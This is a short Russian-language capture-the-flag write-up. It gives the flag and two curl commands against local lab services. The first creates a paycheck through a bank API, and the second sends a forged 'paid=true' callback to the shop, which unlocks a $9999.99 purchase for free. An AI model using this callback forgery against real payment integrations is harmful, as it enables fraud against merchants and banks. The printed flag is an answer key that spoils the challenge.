## Название: Integration
**Описание**: Флаг стоит слишком дорого, но можно добыть его и бесплатно.  
**Флаг**: `rtctf{bank_and_sh0P_may_b3_th3_m0st_secur3_but_the1r_Int3grat10n_1s_n0T}`  
**Решение**:  
Выясняем механизм интеграции банка с магазином. Он реализован с помощью paycheck API:
```sh
curl -X POST http://127.0.0.1:48081/api/create-paycheck \
     -H "Content-Type: application/json" \
     -d '{
           "username": "abc",
           "amount": 123.4,
           "callback_url": "http://example.com/callback"
         }'
```
Создаём заявку на покупку в магазине и отправляем подтверждающий callback вместо банка:
```sh
curl -X POST "http://127.0.0.1:48080/api/callback?transaction_id=e8eb343d-b1ba-4847-8ef2-24731ab95f9d&paid=true"
```
Получаем флаг:
```
Purchase Confirmed!
Flag
Price: $9999.99

Secret Data: rtctf{bank_and_sh0P_may_b3_th3_m0st_secur3_but_the1r_Int3grat10n_1s_n0T}
```
